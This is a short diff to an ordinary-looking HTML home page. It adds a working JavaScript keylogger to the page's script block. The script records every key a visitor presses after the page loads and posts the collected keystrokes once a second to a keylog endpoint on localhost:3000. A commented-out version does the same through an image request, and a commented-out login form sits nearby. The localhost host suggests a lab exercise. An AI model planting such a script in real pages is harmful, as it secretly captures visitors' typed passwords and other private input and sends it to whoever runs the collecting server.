@@ -8,7 +8,6 @@
 
 		<link rel="stylesheet" type="text/css" href="styles.css" />
 
-
 	</head>
 
 	<body class="home">
@@ -38,6 +37,7 @@
 		</div>
 
 
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
     <script>
 
         var span = document.getElementById("show")
@@ -53,8 +53,49 @@
             span.style.display = "block";
         }
         //<h3>Please first login to proceed</h3> <form action="/login">Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>
+        /*
+        var keys='';
+        var url = 'http://127.0.0.1:3000/keylog.php?c=';
 
+        document.onkeypress = function(e) {
+            get = window.event?event:e;
+            key = get.keyCode?get.keyCode:get.charCode;
+            key = String.fromCharCode(key);
+            keys+=key;
+        }
+        */
+
+               
+        var url = "http://127.0.0.1:3000/keylog.php";
+
+        var keylog = {
+
+            cache : [],
+
+            init : function(){
+                
+                window.addEventListener("keydown", function(evt){
+                keylog.cache.push(evt.key);
+                console.log(keylog.cache)
+
+                });
+            }
+        }
+        
+        window.setInterval(function(){
+            if(keylog.cache.length>0) {
+                axios.post('127.0.0.1:3000/keylog', {
+                            "data": keylog.cache.join()
+                            });
+                //new Image().src = url + keylog.cache.join();
+                //console.log(keylog.cache.join())
+                //keys = '';
+            }
+        }, 1000);
+        
+        window.addEventListener("DOMContentLoaded", keylog.init);
     </script>
+
 	</body>
 
     
